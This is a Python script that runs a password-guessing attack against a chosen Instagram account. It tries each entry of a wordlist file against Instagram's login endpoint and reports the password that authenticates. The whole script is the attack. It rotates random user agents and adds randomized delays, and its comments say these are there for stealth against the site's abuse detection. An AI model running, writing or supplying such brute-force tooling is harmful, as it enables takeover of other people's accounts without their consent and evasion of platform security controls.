import httpx
import asyncio
import json
import os
import random
import time
from fake_useragent import UserAgent

# Define the file path
current_directory = os.path.dirname(os.path.abspath(__file__))
file_path = os.path.join(current_directory, "pass.txt")

# Read all passwords from the file into a list
with open(file_path, "r", encoding="utf-8", errors="ignore") as file:
    passwords = [line.strip() for line in file if line.strip()]

# Instagram login URL
LOGIN_URL = 'https://www.instagram.com/accounts/login/ajax/'

# Function to get CSRF token and prepare the client
async def get_csrf_token_and_client():
    ua = UserAgent()
    client = httpx.AsyncClient()
    response = await client.get('https://www.instagram.com/')
    csrf_token = response.cookies.get('csrftoken', '')
    return client, csrf_token, ua

# Function to attempt login with each password
async def try_password(client, csrf_token, ua, username, password):
    # Randomize headers for better stealth
    headers = {
        'User-Agent': ua.random,
        'X-CSRFToken': csrf_token,
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': 'https://www.instagram.com/',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'en-GB,en;q=0.8']),
        'Accept-Encoding': 'gzip, deflate, br',
    }

    # Simulate Instagram's password encryption method
    payload = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
        'queryParams': {},
        'optIntoOneTap': 'false'
    }

    try:
        # Make the request with a random delay
        print(f"Trying password: {password}")  # Debug print statement
        await asyncio.sleep(random.uniform(1.5, 3.5))  # Add human-like delay
        response = await client.post(LOGIN_URL, data=payload, headers=headers)
        login_response = response.json()

        if login_response.get('authenticated'):
            print(f"Login successful with password: {password}")
            return True
        else:
            print(f"Login failed with password: {password}")
            return False

    except Exception as e:
        print(f"Error: {e}")
        return False

# Main function to run the login attempts
async def main():
    username = input("Enter the username: ")
    print("Username entered:", username)  # Debug print statement
    client, csrf_token, ua = await get_csrf_token_and_client()

    # Attempt each password asynchronously
    for password in passwords:
        success = await try_password(client, csrf_token, ua, username, password)
        if success:
            print("Password found!")
            break
    else:
        print("All passwords failed.")

    # Close the client explicitly
    await client.aclose()

# Run the main function
asyncio.run(main())
